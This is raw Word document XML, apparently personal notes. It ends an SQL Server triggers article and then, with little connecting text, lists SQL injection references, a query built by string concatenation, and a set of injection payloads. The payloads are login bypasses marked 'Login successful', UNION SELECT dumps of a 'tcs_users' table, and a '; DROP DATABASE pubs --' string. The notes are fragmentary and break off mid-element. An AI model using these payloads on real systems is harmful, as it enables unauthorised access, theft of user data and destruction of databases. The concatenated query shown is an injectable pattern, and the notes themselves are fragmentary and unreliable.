          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, Level </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, State </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, Procedure </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>trgInsteadOfDelete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, Line </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>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2"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Cannot delete </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-sdkkeyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="339999"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>where</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> salary &gt; </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>1200</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>And this record will not be deleted.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>In a similar way, you can code Instead of Insert and Instead Of Update triggers on your tables.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="351" w:beforeAutospacing="0" w:after="193" w:afterAutospacing="0"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>In this article, I took a brief introduction of triggers, explained the various kinds of triggers – After Triggers and Instead Of Triggers along with their variants and explained how each of them works. I hope you will get a clear understanding about the Triggers in SQL Server and their usage.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pP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shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="273" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00B84F48" w:rsidP="00D01BD2">
      <w:hyperlink r:id="rId38" w:history="1">
        <w:r w:rsidR="00D01BD2" w:rsidRPr="004615BF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://en.wikipedia.org/wiki/SQL_injection</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00B84F48" w:rsidP="00D01BD2">
      <w:hyperlink r:id="rId39" w:history="1">
        <w:r w:rsidR="00D01BD2" w:rsidRPr="004615BF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://msdn.microsoft.com/en-us/library/ff648339.aspx</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00B84F48" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId40" w:history="1">
        <w:r w:rsidR="00D01BD2" w:rsidRPr="004615BF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>https://msdn.microsoft.com/en-us/library/ms161953(SQL.105).aspx</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00B84F48" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId41" w:history="1">
        <w:r w:rsidR="00D01BD2" w:rsidRPr="004615BF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>http://sqlzoo.net/hack/24table.htm</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00B84F48" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId42" w:history="1">
        <w:r w:rsidR="00D01BD2" w:rsidRPr="00F676A4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>https://websec.ca/kb/sql_injection</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00B84F48" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId43" w:history="1">
        <w:r w:rsidR="00D01BD2" w:rsidRPr="00FA4DA1">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>http://www.tizag.com/mysqlTutorial/mysql-php-sql-injection.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00B84F48" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId44" w:history="1">
        <w:r w:rsidR="00D01BD2" w:rsidRPr="00FA4DA1">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="18"/>
            <w:szCs w:val="18"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>https://larrysteinle.com/2011/02/20/use-regular-expressions-to-detect-sql-code-injection/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007B19A5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>http://www.symantec.com/connect/articles/detection-sql-injection-and-cross-site-scripting-attacks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>' ' '</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:r>
        <w:t xml:space="preserve">QUERY </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00DD3533" w:rsidRDefault="00D01BD2" w:rsidP="00D01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D3533">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>statement</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DD3533">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> = "SELECT</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FROM</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users</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WHERE</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name</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w:t>
      </w:r>
      <w:r w:rsidRPr="00DD3533">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DD3533">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">'" + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DD3533">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>userName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DD3533">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> + "';"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2"/>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>‘ OR</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> ‘1’=’1 </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B62615">
        <w:t>' OR</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B62615">
        <w:t xml:space="preserve"> '1'='1'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2"/>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>' ' '</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Get the table name</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>‘</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="4F5155"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">//Login successful </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004D0FE8">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>' or</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004D0FE8">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> 1#</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00E03F75">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00E03F75">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">' UNION ALL SELECT * FROM </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E03F75">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tcs_users</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E03F75">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> WHERE email = '' OR 1=1 -- -' AND pass = '';</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="004215CF">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>' or</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="004215CF">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> 1=1 -- '</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="30" w:after="30" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="30" w:right="30"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005D34A7">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve">1' UNION select * from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005D34A7">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>tcs_users</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005D34A7">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
        </w:rPr>
        <w:t xml:space="preserve"> where 1=1 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005D34A7">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>-- ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:spacing w:line="263" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t>' ;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
        </w:rPr>
        <w:t xml:space="preserve"> DROP DATABASE pubs  --</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:spacing w:line="238" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">SELECT </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>au_lname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>au_fname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="006400"/>
          <w:sz w:val="18"/>
